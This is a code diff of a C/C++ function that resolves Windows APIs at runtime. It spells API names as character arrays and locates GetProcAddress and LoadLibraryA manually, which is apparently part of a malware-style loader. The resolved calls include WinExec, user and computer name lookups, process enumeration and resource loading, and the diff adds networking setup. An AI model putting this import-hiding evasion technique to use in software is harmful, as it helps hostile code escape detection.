@@ -34,6 +34,8 @@ HMODULE					lpDllDbghelp;
 int getapi() {
 	char info[1024];
 
+	int ret = 0;
+
 	char szwsprintfA[] = { 'w','s','p','r','i','n','t','f','A',0 };
 	char szwsprintfW[] = { 'w','s','p','r','i','n','t','f','W',0 };
 	char szGetCurrentProcess[] = { 'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s',0 };
@@ -93,7 +95,8 @@ int getapi() {
 
 	char szGetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
 	char szGetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0 };
-	char szCreateToolhelp32Snapshot[] = { 'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t',0 };
+	char szCreateToolhelp32Snapshot[] = 
+	{ 'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t',0 };
 	char szProcess32First[] = { 'P','r','o','c','e','s','s','3','2','F','i','r','s','t','W',0 };
 	char szProcess32Next[] = { 'P','r','o','c','e','s','s','3','2','N','e','x','t','W',0 };
 
@@ -161,7 +164,8 @@ int getapi() {
 	char szLoadResource[] = { 'L','o','a','d','R','e','s','o','u','r','c','e',0 };
 	char szLockResource[] = { 'L','o','c','k','R','e','s','o','u','r','c','e',0 };
 
-	char szMakeSureDirectoryPathExists[] = { 'M','a','k','e','S','u','r','e','D','i','r','e','c','t','o','r','y','P','a','t','h','E','x','i','s','t','s',0 };
+	char szMakeSureDirectoryPathExists[] =
+	{ 'M','a','k','e','S','u','r','e','D','i','r','e','c','t','o','r','y','P','a','t','h','E','x','i','s','t','s',0 };
 
 	PEParser::getBaseApi(&lpDllKernel32,(FARPROC*)&lpGetProcAddress, (FARPROC*)&lpLoadLibraryA);
 	if (lpGetProcAddress == 0 || lpLoadLibraryA == 0 || lpDllKernel32 == 0)
@@ -177,7 +181,7 @@ int getapi() {
 	}
 		
 	lpGetUserNameA = (ptrGetUserNameA)lpGetProcAddress(lpDlladvapi32, szGetUserNameA);
-
+	
 	lpGetComputerNameA = (ptrGetComputerNameA)lpGetProcAddress(lpDllKernel32, szGetComputerNameA);
 	lpWinExec = (ptrWinExec)lpGetProcAddress(lpDllKernel32, szWinExec);
 	lpGetSystemDirectoryA = (ptrGetSystemDirectoryA)lpGetProcAddress(lpDllKernel32, szGetSystemDirectoryA);
@@ -210,6 +214,13 @@ int getapi() {
 		return FALSE;
 	}
 	lpMakeSureDirectoryPathExists = (ptrMakeSureDirectoryPathExists)lpGetProcAddress(lpDllDbghelp, szMakeSureDirectoryPathExists);
-	
+
+// 	sprintf(info, "address:%p", lpMakeSureDirectoryPathExists);
+// 	MessageBoxA(0, info, info, MB_OK);
+
+
+	WSAData wsa;
+	ret = WSAStartup(0x0202, &wsa);
+
 	return TRUE;
 }
